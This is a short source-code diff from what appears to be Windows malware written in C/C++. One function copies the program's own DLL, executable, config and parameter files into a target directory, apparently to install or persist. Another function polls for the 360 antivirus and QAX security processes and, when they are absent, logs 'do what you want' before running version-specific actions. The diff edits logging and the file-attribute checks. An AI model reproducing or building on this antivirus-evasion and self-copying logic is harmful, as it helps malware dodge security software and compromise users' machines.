@@ -178,26 +178,30 @@ int backHome(char* pDstPath, char* szCurrentDir, char szDllName[MAX_DLL_COUNT][M
 
 	do
 	{
-		writeLog("find current file:%s to copy\r\n", stWfd.cFileName);
-
 		if (stWfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
 		{
 			if (lplstrcmpiA(stWfd.cFileName, szLastDir) == 0 || lplstrcmpiA(stWfd.cFileName, ".") == 0)
 			{
 				continue;
 			}
+			else {
+				//need to process
+			}
 		}
-		else if (stWfd.dwFileAttributes & FILE_ATTRIBUTE_ARCHIVE)
+		else /*if (stWfd.dwFileAttributes & FILE_ATTRIBUTE_ARCHIVE)*/
 		{
 
 			if (lplstrcmpiA(stWfd.cFileName, curDllName) == 0 || lplstrcmpiA(stWfd.cFileName, curExeName) == 0 ||
 				lplstrcmpiA(stWfd.cFileName, CONFIG_FILENAME) == 0 ||
 				lplstrcmpiA(stWfd.cFileName, PARAMS_FILENAME) == 0)
 			{
+				writeLog("find file:%s attribute:%x to copy\r\n", stWfd.cFileName, stWfd.dwFileAttributes);
+
 				string dstfn = string(pDstPath) + stWfd.cFileName;
 				string srcfn = string(szCurrentDir) + stWfd.cFileName;
 				if (_access(dstfn.c_str(), 0) == 0)
 				{
+					writeLog("file:%s exist\r\n", stWfd.cFileName);
 					continue;
 				}
 
@@ -397,7 +401,7 @@ DWORD __stdcall snoop360snooze()
 			b360Running = GetProcessIdByName(sz360Tray);
 			if (b360Running == FALSE && bQAXSafeRunning == FALSE)
 			{
-				writeLog("360 is absent so you can do something you want\r\n");
+				writeLog("tsz is absent do what you want\r\n");
 
 				if (iSystemVersion <= SYSTEM_VERSION_XP)
 				{
